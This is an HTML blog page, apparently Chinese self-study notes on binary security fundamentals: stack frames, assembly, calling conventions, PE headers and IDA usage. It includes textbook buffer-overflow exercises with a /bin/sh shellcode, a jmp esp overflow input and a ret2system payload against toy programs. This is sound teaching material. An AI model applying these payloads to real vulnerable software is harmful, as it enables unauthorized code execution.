@@ -1,0 +1,1033 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="OtterV">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="OtterV">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="Th3 5tupid 0ne">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>Binary security 基础 · null</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >DADDY_HONG&#39;s</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Binary security 基础</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>DADDY_HONG's</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/18.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Binary security 基础
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Binary Security">Binary Security</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3.1k</span>阅读时长: <span class="post-count reading-time">11 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/09/10</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h3 id="暑期自学知识复习"><a href="#暑期自学知识复习" class="headerlink" title="暑期自学知识复习"></a>暑期自学知识复习</h3><hr>
+<h4 id="0x00-栈帧"><a href="#0x00-栈帧" class="headerlink" title="0x00 栈帧"></a>0x00 栈帧</h4><h5 id="1-销毁栈帧的两种写法："><a href="#1-销毁栈帧的两种写法：" class="headerlink" title="1.销毁栈帧的两种写法："></a>1.销毁栈帧的两种写法：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave    &lt;=&gt;    mov esp, ebp</span><br><span class="line">                pop ebp</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-压参的两种写法："><a href="#2-压参的两种写法：" class="headerlink" title="2.压参的两种写法："></a>2.压参的两种写法：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push 1				sub esp,0xC</span><br><span class="line">push 2		 &lt;=&gt;   	mov [esp],3</span><br><span class="line">push 3				mov [esp+0x4],2</span><br><span class="line">call func			mov [esp+0x8],1</span><br><span class="line">  					call func</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-两个很棒的例题："><a href="#3-两个很棒的例题：" class="headerlink" title="3.两个很棒的例题："></a>3.两个很棒的例题：</h5><ol>
+<li><p>以下是一段C语言程序片段，假设栈可执行，<code>“jmp esp”</code>的地址为 <code>0x8048570</code>，s的位置在<code>ebp - 0x30</code>处。现在已知一段能获得系统控制台权限的<code>shellcode</code>： <code>“\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80”</code> 请问如何构造输入，使得程序能获得系统控制台权限？</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123; 	</span><br><span class="line">true<span class="keyword">char</span> s[<span class="number">16</span>]; <span class="comment">// ebp - 0x30 </span></span><br><span class="line">truegets(s); </span><br><span class="line">true<span class="built_in">puts</span>(s); </span><br><span class="line">true<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Answer: </span><br><span class="line">输入： </span><br><span class="line">‘a’ * <span class="number">0x34</span> + ‘\x70\x85\x04\x08’<span class="comment">/*!!!小端序，低位储存低位，高位储存高位，逆序存储方式!!!*/</span> + ‘\x31\xc9\xf7\xe1\x51\x68\x2f\x2f</span><br><span class="line">\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80’ </span><br><span class="line">（注：前<span class="number">0x34</span>字节作为填充可为除换行符以外的所有字符） 【以上为常规思路，若利用Stack Pivoting技术抬高shellcode地址 的方法也正确，故答案不唯一】</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在函数返回的时候，ESP 恰好指向栈帧中返回地址的后 一个位置！ </p>
+<p>一般情况下，ESP 寄存器中的地址总是指向系统栈中且不会被溢出的数据破坏。函数返回时，ESP 所指的位置恰好是我们所淹没的返回地址的下一个位置。</p>
+<p>由于 ESP 寄存器在函数返回后不被溢出数据干扰，且始终指向返回地址之后的位置，我们可以进行动态定位。 </p>
+<p>（1）用内存中任意一个 jmp esp 指令的地址覆盖函数返回地址，而不是原来用手工查出的 shellcode 起始地址直接覆盖。 </p>
+<p>（2）函数返回后被重定向去执行内存中的这条jmp esp指令，而不是直接开始执行shellcode。</p>
+<p>（3）由于 esp 在函数返回时仍指向栈区（函数返回地址之后），jmp esp 指令被执行后，处 理器会到栈区函数返回地址之后的地方取指令执行。 </p>
+<p>（4）重新布置 shellcode。在淹没函数返回地址后，继续淹没一片栈空间。将缓冲区前边一 段地方用任意数据填充，把 shellcode 恰好摆放在函数返回地址之后。这样，jmp esp 指令执行 过后会恰好跳进shellcode。 </p>
+<p>这种定位 shellcode 的方法使用进程空间里一条 jmp esp 指令作为“跳板”，不论栈帧怎么 “移位”，都能够精确地跳回栈区，从而适应程序运行中 shellcode 内存地址的动态变化。 </p>
+<p>——&lt;0day安全软件漏洞分析技术&gt;</p>
+</blockquote>
+</li>
+<li><p>阅读以下C语言程序，请问如何布置输入可以使得程序执行<code>system(“/bin/sh”)</code>这个语句？并使得四字节整型变量a值改变为100（十进制）？其中输入变量s地址位于<code>ebp - 0x20</code>，变量a的地址为 <code>ebp - 0x10</code>，<code>system</code>函数地址为<code>0xfff53090</code>处，<code>“/bin/sh”</code>字符串的地址为<code>0xfff5602d</code>处。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">8</span>];  <span class="comment">// ebp - 0x20</span></span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0xdeadbeef</span>;  <span class="comment">// ebp - 0x10</span></span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'a' * 0x10 + '\x64\x00\x00\x00' + 'a' * 0x10 + '\x90\x30\xf5\xff' + 'aaaa' /*用于代替函数返回地址，前面进入system函数，为了符合栈帧格式，ebp下要有函数返回地址。注此时ebp还没有push进去*/ + '\x2d\x60\xf5\xff'</span><br></pre></td></tr></table></figure>
+
+<p><strong>一定注意讲函数操作的栈和实际地址分开!!!</strong></p>
+</li>
+</ol>
+<h4 id="0x01-汇编基础"><a href="#0x01-汇编基础" class="headerlink" title="0x01 汇编基础"></a>0x01 汇编基础</h4><h5 id="1-16位、32位、64位汇编区别"><a href="#1-16位、32位、64位汇编区别" class="headerlink" title="1.16位、32位、64位汇编区别"></a>1.16位、32位、64位汇编区别</h5><ol>
+<li><p>寄存器</p>
+</li>
+<li><p>函数调用方式不同，32位、64位不再使用栈帧</p>
+</li>
+<li><p>16位操作系统的中段地址和偏移地址在32位中消失了，在32位操作系统中统一采用平坦的内存地址模式寻址。</p>
+</li>
+<li><p>16位操作系统中的程序运行在RING0级，也就是说普通程序和操作系统程序运行在同一个级别并且拥有最高权限，而32位操作系统中的程序一般只拥有RING3级别运行权限，程序的所有操作都受到操作系统控制，若程序要获得RING0操作特权只能通过驱动程序实现。</p>
+<p>386保护模式：分系统态与用户态，相当于起到隔离作用。</p>
+</li>
+<li><p>16位操作系统的可执行文件格式和32位操作系统的可执行文件格式不同，在32位的Windows操作系统中，可执行文件的格式加PE格式，32位的Windows操作系统运行在CPU的保护之上，而16位的系统则运行在CPU的实模式上。</p>
+</li>
+</ol>
+<h5 id="2-lea"><a href="#2-lea" class="headerlink" title="2.lea"></a>2.<code>lea</code></h5><p><code>lea</code>指令可以将有效地址传送到指定的的寄存器。对标志位无影响。</p>
+<p>有时候可以用<code>mov</code>代替，也有特定起作用的时候。</p>
+<h5 id="3-test"><a href="#3-test" class="headerlink" title="3.test"></a>3.<code>test</code></h5><p><code>test</code>命令将两个操作数进行逻辑与运算，并根据运算结果设置相关的标志位。<code>test</code>命令的两个操作数不会被改变。运算结果在设置过相关标记位后会被丢弃。</p>
+<p><code>test eax,eax</code> 用于判断<code>eax</code>是否为0。</p>
+<h5 id="3-例题"><a href="#3-例题" class="headerlink" title="3.例题"></a>3.例题</h5><p>阅读下面汇编代码，回答下面三个问题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">truemov ecx, 0</span><br><span class="line">L1:</span><br><span class="line">    lea edx, [esp + 0x28]		//加粗</span><br><span class="line">    add edx, ecx</span><br><span class="line">    mov al, [edx]</span><br><span class="line">    test al, al</span><br><span class="line">    jz L2</span><br><span class="line">    or al, 0x80</span><br><span class="line">    mov [edx], al</span><br><span class="line">    inc ecx</span><br><span class="line">    jmp L1</span><br><span class="line">L2:</span><br><span class="line">    lea eax, [esp + 0x28]</span><br><span class="line">    mov [esp + 0x4], eax</span><br><span class="line">    lea eax, [esp + 0x14]</span><br><span class="line">    mov [esp], eax</span><br><span class="line">    call strcmp</span><br><span class="line">    test eax, eax</span><br><span class="line">    jnz L3</span><br><span class="line">    call XXX</span><br><span class="line">L3:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+
+<p>附加说明：从<code>esp + 0x14</code>这个内存地址开始，由低地址到高地址存放着一段二进制串，分别为：</p>
+<p><code>E6 EC E1 E7 BA F4 E5 F3 F4 F4 E5 F3 F4 00</code></p>
+<p>另外，在本程序中，<code>[esp]</code>存放着接下来所调用函数的第一个参数，<code>[esp + 0x4]</code>存放着接下来所调用函数的第    二个参数。在函数调用后面紧接着的<code>eax</code>存放着函数的返回值。</p>
+<p>①红色加粗的那段指令可不可以改写成<code>“mov edx, esp + 0x28”</code>？请说明理由。</p>
+<p>②从<code>esp + 0x28</code>这个内存地址开始，由低地址到高地址要存放着一段什么样的二进制串，XXX函数才会被调用？</p>
+<p>③若第②题的二进制串的意义是一段ASCII码，请把它翻译成字符串。</p>
+<p><strong>Answer:</strong></p>
+<p>① 不能，因为语法上不允许</p>
+<blockquote>
+<p>【解析】其实这条指令的意义是将<code>esp+0x28</code>这个结果赋给<code>edx</code>，但是若直接<code>mov edx, esp+0x28</code>，这个在语法上不允许，但是<code>mov edx, [esp+0x28]</code>是允许的，不过这样含义就变了，变成了将<code>esp+0x28</code>这个位置存放的值给<code>edx</code>了，所以变通一下，只要把它改成<code>lea edx, [esp+0x28]</code>就行了，这有点像C语言中<code>*(&amp;a)=1</code>一样，实际上就是a赋值1，但是因为某些其他原因需要这么绕一下</p>
+</blockquote>
+<p>!!!注意理解，该程序中需要引用<code>esp+0x28</code>做地址，但无法直接用<code>mov</code>赋，于是用了<code>lea</code>。</p>
+<p>② <code>66 6C 61 67 3A 74 65 73 74 74 65 73 74 00</code></p>
+<blockquote>
+<p>【解析】我相信看完程序和题干内容后，你应该能反应过来，在<code>esp+0x28</code>和<code>esp+0x14</code>这两个位置开始分别存放着两个二进制字串，我们姑且把它命名为a和b。现在是已知<code>esp+0x14</code>这个字串让你推出<code>esp+0x28</code>这个字串。先仔细分析L1那一小节，它先把<code>esp+0x28</code>这个值赋给<code>edx</code>作为字串的首地址，然后再把<code>edx</code>加上<code>ecx</code>，然后观察一下，这个<code>ecx</code>是从0开始，每次循环都<code>inc</code>加1，那么<code>edx</code>加上<code>ecx</code>相当于就是遍历这个二进制字串的每一个元素，用C语言风格写就是<code>a[ecx]</code>。这时候<code>mov al, [edx]</code>很关键，它说明取出<code>edx</code>所指向的元素，而且只取一个字节（因为左值是<code>al</code>，字长1字节）。这时候<code>test al, al</code>和<code>jz L2</code>说明如果遇到0就不做了，直接跳到L2去，否则就将<code>al</code>与<code>0x80</code>做“或”运算，并且把做完的结果又放回去。所以L1段的功能就是把二进制串a整体与<code>0x80</code>做“或”运算，以<code>00</code>作为结束。</p>
+<p>这时候来看L2段，给<code>[esp+0x4]</code>和<code>[esp]</code>赋值的意义提示里面已经说了，是为了给<code>strcmp</code>函数传参，这个具体是为什么会在“栈帧”那一讲细说，这里只要知道是这个意思就行了，所以L2段写成C语言：</p>
+<p><code>eax = strcmp</code>(二进制串b的首地址，二进制串a的首地址);</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">if</span> (eax == <span class="number">0</span>)       <span class="comment">//比较成功</span></span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt; 	XXX();</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; <span class="keyword">else</span> &#123;</span><br><span class="line">&gt; L3:</span><br><span class="line">&gt; 	...</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>所以这个程序的意思就很简单了，先将a字串与<code>0x80</code>做“或”运算再跟b比对，如果比对成功就可以执行XXX函数，否则不能执行。现在题目是已知b来反推a，所以我们来分析一下逆算法。</p>
+<p>当m与<code>0x80</code>做“或”运算等于n时，由于0x80写成二进制就是10000000，也就是说m的后七位实际上是和n的后七位一样，<strong>关键是m的最高位有可能是0，也有可能是1</strong>，其实这道题我应该在第②题就告诉你们最终结果的含义是ASCII码，这样你们就知道最高位是0了，但是就算不提示，你们也要明白最终结果肯定是<strong>越接近可读字符越好</strong>，这也是CTF比赛中的潜规则，所以说如果二进制串中出现<code>0x3X</code>,<code>0x4X</code>,<code>0x6X</code>和部分<code>0x7X</code>（X表示一个任意的十六进制位）时一定要高度留心，因为它们作为<code>ASCII</code>码时是可读字符。</p>
+<p>所以结果只要把b串的后七位不变，最高位变为0就行。</p>
+<p>b串： <code>E6 EC E1 E7 BA F4 E5 F3 F4 F4 E5 F3 F4 00</code></p>
+<p>a串： <strong><code>66 6C 61 67 3A 74 65 73 74 74 65 73 74 00</code></strong>`</p>
+<p>第4题的第③小问也就自然了，把a串随便放到一个<code>ASCII</code>码转字符串的工具里面去，很容易发现其明文为：</p>
+<p><code>flag:testtest</code></p>
+</blockquote>
+<h4 id="0x02-函数调用约定"><a href="#0x02-函数调用约定" class="headerlink" title="0x02 函数调用约定"></a>0x02 函数调用约定</h4><p><code>__cdecl</code>: C/C++默认方式，参数从右向左入栈，主调函数销参</p>
+<p><code>__stdcall</code>: windows API默认方式，参数从右向左入栈，被调函数销参；返回时命令为ret 0Ch，需要销毁三个参数。并且可以看到三个参数都是通过栈帧传递的。</p>
+<p><code>__fastcall</code>: 快速调用，参数优先从寄存器（ECX、EDX）传入 ；返回时命令为ret 4，表示一个需要销毁的参数。另外两个参数通过寄存器传递。</p>
+<h4 id="0x03-PE头"><a href="#0x03-PE头" class="headerlink" title="0x03 PE头"></a>0x03 PE头</h4><p>为装载时大小一致，补充部分区域用0补齐。</p>
+<p>DOS头为了兼容DOS环境。</p>
+<p>PE文件分析器了解一下。</p>
+<h4 id="0x04-IDA常用操作（先码为敬orz）"><a href="#0x04-IDA常用操作（先码为敬orz）" class="headerlink" title="0x04 IDA常用操作（先码为敬orz）"></a>0x04 IDA常用操作（先码为敬orz）</h4><h5 id="1-IDA常用快捷键"><a href="#1-IDA常用快捷键" class="headerlink" title="1.IDA常用快捷键"></a>1.IDA常用快捷键</h5><ol>
+<li><p>动态调试相关</p>
+<p><code>ESC</code>  退到上一个操作地址</p>
+<p><code>F4</code>  运行到光标处</p>
+<p><code>F7</code>  单步执行</p>
+<p><code>F8</code>  过程执行</p>
+<p><code>G</code> 搜索地址或者符号</p>
+<p><code>CTRL+F7</code>  运行到函数返回地址</p>
+<p><code>CTRL+ALT+B</code> 打开断点列表</p>
+</li>
+<li><p>C伪代码相关</p>
+<p><code>空格</code>   反汇编窗口的图形模式与文本模式的互换</p>
+<p><code>分号键</code>   注释</p>
+<p><code>Num + *</code>   修改数组信息</p>
+<p><code>N</code>  重命名</p>
+<p><code>X</code>  交叉引用</p>
+<p><code>Y</code>  明确设置函数信息</p>
+<p><code>F5</code>  C伪代码</p>
+<p><code>ALT+A</code>  修改字符串风格</p>
+</li>
+<li><p>汇编代码相关</p>
+<p><code>空格键</code>    反汇编窗口切换文本跟图形</p>
+<p><code>C</code>  (code)   光标地址出内容解析成代码</p>
+<p><code>P</code>   在函数开始处使用P，从当前地址处解析成函数</p>
+<p><code>D</code>  (data)    解析成数据</p>
+<p><code>A</code>  (ASCII)    解析成ASCII</p>
+<p><code>U</code>  (unDefined)    解析成未定义的内容</p>
+<p><code>ALT+A</code>   修改字符串风格</p>
+<p><code>CTRL +S</code>   二进制段的开始地址结束地址</p>
+</li>
+<li><p>其他</p>
+<p><code>ALT+B</code> 搜索16进制 搜索opcode 如ELF文件头</p>
+<p><code>ALT+T</code> 搜索文本</p>
+<p><code>ALT+M</code>  添加标签</p>
+<p><code>CTRL+M</code> 列出所有标签</p>
+<p><code>CTRL +S</code>  二进制段的开始地址结束地址</p>
+</li>
+</ol>
+<h5 id="2-IDA插件"><a href="#2-IDA插件" class="headerlink" title="2.IDA插件"></a>2.IDA插件</h5><ol>
+<li><p><a href="https://github.com/keystone-engine/keypatch" target="_blank" rel="noopener">Keypatch</a></p>
+<p>超级好用的打补丁插件</p>
+</li>
+<li><p>IDApython</p>
+<p>自行编写脚本</p>
+<p>无需安装</p>
+</li>
+<li><p><a href="https://github.com/polymorf/findcrypt-yara" target="_blank" rel="noopener">findcrypt-yara</a></p>
+<p>找加密方式</p>
+</li>
+<li><p><a href="https://github.com/zhkl0228/AndroidAttacher" target="_blank" rel="noopener">AndroidAttacher</a></p>
+<p>调试安卓中so文件</p>
+</li>
+<li><p><a href="https://github.com/cseagle/x86emu" target="_blank" rel="noopener">x86emu</a></p>
+<p>CPU模拟器</p>
+</li>
+<li><p><a href="https://github.com/illera88/Ponce" target="_blank" rel="noopener">Ponce</a></p>
+<p>符号执行</p>
+</li>
+</ol>
+<h4 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h4><ol>
+<li>伪C代码具有欺骗性，汇编代码阅读及转换能力需提高</li>
+<li>做题太少，看书太少，理解不足，练习不足，熟练度不足</li>
+</ol>
+
+    </article>
+    <!-- license  -->
+    
